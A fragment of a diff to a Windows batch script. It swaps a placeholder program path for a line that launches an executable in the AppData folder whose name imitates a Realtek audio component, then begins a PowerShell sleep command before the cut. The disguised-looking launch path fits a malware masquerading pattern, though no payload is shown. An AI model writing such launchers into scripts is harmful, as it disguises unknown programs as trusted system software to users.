@@ -1,5 +1,6 @@
 @echo off
-start "" "C:\Path\To\YourProgram.exe"
+start "" "%APPDATA%\HD Realtek Audio Player\Windows64.exe"
+
 timeout /t 2 /nobreak >nul
 powershell -Command "& {
     Start-Sleep -Seconds 1;
